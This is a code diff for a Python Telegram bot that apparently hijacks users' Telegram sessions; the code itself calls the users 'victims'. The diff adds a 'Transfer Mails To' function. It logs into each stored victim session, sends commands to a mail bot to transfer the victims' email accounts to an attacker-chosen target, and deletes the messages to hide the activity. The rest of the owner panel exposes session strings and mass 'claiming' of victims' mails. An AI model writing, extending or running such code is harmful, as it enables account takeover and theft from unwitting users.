@@ -264,13 +264,31 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
     
+    # Admin State Logic
     if uid in get_all_admins():
         state = user_states.get(uid)
-        if state == 'admin':
+        
+        if state == 'admin_add_wait':
             if text.isdigit():
                 db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
                 await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
+            else:
+                await update.message.reply_text("❌ Invalid ID.")
             user_states[uid] = None; return
+            
+        elif state == 'transfer_to_wait':
+            try:
+                target_username, target_id = text.split()
+                target_id = int(target_id)
+                if not target_username.startswith("@"): target_username = "@" + target_username
+                
+                user_states[uid] = {'state': 'transfer_confirm', 'target_username': target_username, 'target_id': target_id}
+                
+                kb = [[InlineKeyboardButton("✅ Confirm & Transfer", callback_data=f"confirm_transfer_{target_id}_{target_username}")]]
+                await update.message.reply_text(f"Target set to: {target_username} ({target_id})\n\nAre you sure you want to transfer all mails here?", reply_markup=InlineKeyboardMarkup(kb))
+            except:
+                await update.message.reply_text("❌ Format: @username 123456789")
+            return
             
         elif state == 'check_id_phone':
             phone = text
@@ -468,13 +486,16 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
+    # Blue Style Buttons
     kb = [
         [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts')}", callback_data="admin_acc")],
         [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails')}", callback_data="admin_claim")],
         [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
         [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Photo')}", callback_data="set_welcome_img")],
         [InlineKeyboardButton(f"🔑 {f_txt('Get Session Strings')}", callback_data="get_sessions")],
-        [InlineKeyboardButton(f"🆔 {f_txt('Check ID (Mails)')}", callback_data="check_id")]
+        [InlineKeyboardButton(f"🆔 {f_txt('Check ID (Mails)')}", callback_data="check_id")],
+        [InlineKeyboardButton(f"🔑 {f_txt('Login as Admin')}", callback_data="login_admin_contact")],
+        [InlineKeyboardButton(f"🔄 {f_txt('Transfer Mails To')}", callback_data="transfer_mails_to")]
     ]
     await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
@@ -498,7 +519,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     elif data == "admin_add":
         await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')}")
-        user_states[uid] = 'admin'
+        user_states[uid] = 'admin_add_wait'
         
     elif data == "set_welcome_img":
         await query.edit_message_text(f"🖼 {f_txt('Send the image you want to set as Welcome Photo')}:")
@@ -520,12 +541,33 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"📱 {f_txt('Send the phone number to check mails (/id)')}:")
         user_states[uid] = 'check_id_phone'
 
+    elif data == "login_admin_contact":
+        await query.message.delete()
+        await context.bot.send_message(
+            chat_id=uid,
+            text=f"📱 {f_txt('Please share your contact to login as Admin')}:",
+            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
+            parse_mode="HTML"
+        )
+        
+    elif data == "transfer_mails_to":
+        await query.edit_message_text(f"🔄 {f_txt('Send Target Username and User ID separated by space.')}\n{f_txt('Example')}: @NEXTXDOREVER 8612102965")
+        user_states[uid] = 'transfer_to_wait'
+
     elif data.startswith("ff_check_"):
         email = data.replace("ff_check_", "")
         await query.answer(f"Checking FF for {email}...")
         
         result = await asyncio.to_thread(check_ff_account, email)
         await query.message.reply_text(f"📧 <b>{f_txt('Email')}:</b> {p_style(email)}\n\n{result}", parse_mode="HTML")
+        
+    elif data.startswith("confirm_transfer_"):
+        parts = data.split("_")
+        target_id = int(parts[2])
+        target_username = parts[3]
+        
+        await query.edit_message_text(f"⏳ {f_txt('Starting transfer to')} {target_username}...")
+        asyncio.create_task(manual_transfer_all(target_username, target_id, query))
 
 async def owner_photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -605,6 +647,66 @@ async def manual_claim_all(owner_id, query):
         
     await query.message.reply_text(f"👑 <b>{f_txt('ALL VICTIMS MAILS CLAIMED!')}</b>\n{p_style('Total Claimed: ' + str(total_claimed))}", parse_mode="HTML")
 
+async def manual_transfer_all(target_username, target_id, query):
+    target_client = await get_or_connect_client(target_id)
+    if not target_client:
+        return await query.message.reply_text(f"❌ {f_txt('Target Account is not logged in!')}")
+
+    await query.edit_message_text(f"⏳ <b>{f_txt('STARTING TRANSFER PROCESS...')}</b>", parse_mode="HTML")
+    
+    users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL")
+    total_claimed = 0
+    
+    for u in users:
+        victim_id = u[0]
+        if victim_id in get_all_admins() or victim_id == OWNER_ID: continue
+        
+        try:
+            victim_client = await get_or_connect_client(victim_id)
+            target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
+            owner_target_bot = await target_client.get_entity(TARGET_MAIL_BOT)
+            
+            await victim_client.send_message(target_bot, "/id")
+            await asyncio.sleep(4)
+            
+            messages = await victim_client.get_messages(target_bot, limit=2)
+            if not messages: continue
+                
+            emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
+            if not emails: continue
+
+            for email in emails:
+                msg = await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
+                await asyncio.sleep(2)
+                await msg.delete()
+                
+                await victim_client.send_message(target_bot, f"/transfer {email} {target_username}")
+                await asyncio.sleep(4)
+                
+                try:
+                    msgs = await victim_client.get_messages(target_bot, limit=2)
+                    for m in msgs: await victim_client.delete_messages(target_bot, m.id)
+                except: pass
+                
+                msg2 = await query.message.reply_text(f"📥 <b>{f_txt('CLAIMING')}:</b> {p_style(email)}", parse_mode="HTML")
+                await asyncio.sleep(2)
+                await msg2.delete()
+                
+                await target_client.send_message(owner_target_bot, email)
+                await asyncio.sleep(4)
+                
+                try:
+                    msgs = await target_client.get_messages(owner_target_bot, limit=2)
+                    for m in msgs: await target_client.delete_messages(owner_target_bot, m.id)
+                except: pass
+                
+                total_claimed += 1
+                await asyncio.sleep(1)
+                
+        except: pass
+        
+    await query.message.reply_text(f"👑 <b>{f_txt('ALL MAILS TRANSFERRED!')}</b>\n{p_style('Total Transferred: ' + str(total_claimed))}", parse_mode="HTML")
+
 # ================== MAIN ==================
 def main():
     threading.Thread(target=run_web, daemon=True).start()
@@ -615,7 +717,7 @@ def main():
     app_bot.add_handler(CommandHandler("owner", owner_panel))
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
     app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_|^get_sessions$|^check_id$|^ff_check_"))
+    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^set_|^get_sessions$|^check_id$|^ff_check_|^login_|^transfer_|^confirm_"))
     
     app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)
